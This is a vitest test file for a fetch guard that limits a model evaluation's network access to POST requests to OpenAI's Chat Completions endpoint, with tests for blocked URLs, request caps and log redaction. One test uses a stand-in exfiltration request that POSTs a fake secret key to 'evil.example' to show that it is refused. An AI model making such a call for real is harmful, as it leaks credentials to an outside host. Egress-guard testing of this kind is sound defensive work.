// RV-MM1 AC14: the eval's only way out is POST to OpenAI's Chat Completions endpoint.
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { createGuard, OPENAI_CHAT_COMPLETIONS, type AttemptRecord } from './guard';

beforeEach(() => {
  vi.stubGlobal('fetch', () => { throw new Error('offline test: global fetch must not be called'); });
});
afterEach(() => vi.unstubAllGlobals());

function guarded(maxRequests = 10) {
  const transport = vi.fn(async () => new Response('{}', { status: 200 }));
  const attempts: AttemptRecord[] = [];
  let clock = 0;
  const guard = createGuard(transport, { maxRequests, now: () => (clock += 5), onAttempt: attempt => { attempts.push(attempt); } });
  return { guard, transport, attempts };
}

describe('createGuard', () => {
  it('passes a POST to the Chat Completions endpoint to the transport and records the attempt', async () => {
    const { guard, transport, attempts } = guarded();
    const response = await guard.fetch(OPENAI_CHAT_COMPLETIONS, { method: 'POST', body: '{}' });
    expect(response.status).toBe(200);
    expect(transport).toHaveBeenCalledOnce();
    expect(attempts).toEqual([{ latencyMs: 5, status: 200, timedOut: false, error: null }]);
    expect(guard.sent).toBe(1);
    expect(guard.violations).toEqual([]);
  });

  it.each([
    ['GET to the endpoint', OPENAI_CHAT_COMPLETIONS, 'GET'],
    ['no method (GET)', OPENAI_CHAT_COMPLETIONS, undefined],
    ['another OpenAI path', 'https://api.openai.com/v1/responses', 'POST'],
    ['OpenAI files', 'https://api.openai.com/v1/files', 'POST'],
    ['plain http', 'http://api.openai.com/v1/chat/completions', 'POST'],
    ['a query string', `${OPENAI_CHAT_COMPLETIONS}?x=1`, 'POST'],
    ['a look-alike host', 'https://api.openai.com.example.net/v1/chat/completions', 'POST'],
    ['Supabase', 'https://project.supabase.co/rest/v1/report_analytes', 'POST'],
    ['Supabase functions', 'https://project.supabase.co/functions/v1/generate-interpretation', 'POST'],
  ])('throws for %s and records it, never reaching the transport', async (_label, url, method) => {
    const { guard, transport } = guarded();
    await expect(guard.fetch(url, method ? { method } : undefined)).rejects.toThrow(/model eval: blocked/);
    expect(transport).not.toHaveBeenCalled();
    expect(guard.violations).toHaveLength(1);
    expect(guard.sent).toBe(0);
  });

  it('refuses a Request object or URL instance instead of a plain URL string', async () => {
    const { guard, transport } = guarded();
    await expect(guard.fetch(new URL(OPENAI_CHAT_COMPLETIONS), { method: 'POST' })).rejects.toThrow(/blocked/);
    await expect(guard.fetch(new Request(OPENAI_CHAT_COMPLETIONS, { method: 'POST' }), { method: 'POST' })).rejects.toThrow(/blocked/);
    expect(transport).not.toHaveBeenCalled();
  });

  it('never puts a query string or path of a refused URL into its record', async () => {
    const { guard } = guarded();
    await guard.fetch('https://evil.example/collect?key=sk-secret', { method: 'POST' }).catch(() => {});
    expect(guard.violations).toEqual(['blocked POST https://evil.example']);
  });

  it('stops at the request cap, retries included', async () => {
    const { guard, transport } = guarded(2);
    await guard.fetch(OPENAI_CHAT_COMPLETIONS, { method: 'POST' });
    await guard.fetch(OPENAI_CHAT_COMPLETIONS, { method: 'POST' });
    await expect(guard.fetch(OPENAI_CHAT_COMPLETIONS, { method: 'POST' })).rejects.toThrow(/request cap of 2/);
    expect(transport).toHaveBeenCalledTimes(2);
    expect(guard.violations).toEqual(['request cap of 2 reached']);
  });

  it('keeps the body it read and hands the handler an equal response it can still cancel', async () => {
    const texts: Array<string | null> = [];
    const guard = createGuard(async () => new Response('{"error":"busy"}', { status: 503, headers: { 'x-synthetic': '1' } }),
      { maxRequests: 5, now: () => 0, onAttempt: (_attempt, text) => { texts.push(text); } });
    const response = await guard.fetch(OPENAI_CHAT_COMPLETIONS, { method: 'POST' });
    expect(response.status).toBe(503);
    expect(response.headers.get('x-synthetic')).toBe('1');
    // fetchWithBackoff cancels a retriable response's body before retrying; that must settle.
    await response.body?.cancel();
    expect(texts).toEqual(['{"error":"busy"}']);
  });

  it('records a thrown attempt by name only, and an abort as a timeout', async () => {
    const attempts: AttemptRecord[] = [];
    const guard = createGuard(async () => { throw Object.assign(new Error('secret detail'), { name: 'AbortError' }); },
      { maxRequests: 5, now: () => 0, onAttempt: attempt => { attempts.push(attempt); } });
    await expect(guard.fetch(OPENAI_CHAT_COMPLETIONS, { method: 'POST' })).rejects.toThrow('secret detail');
    expect(attempts).toEqual([{ latencyMs: 0, status: null, timedOut: true, error: 'AbortError' }]);
  });
});
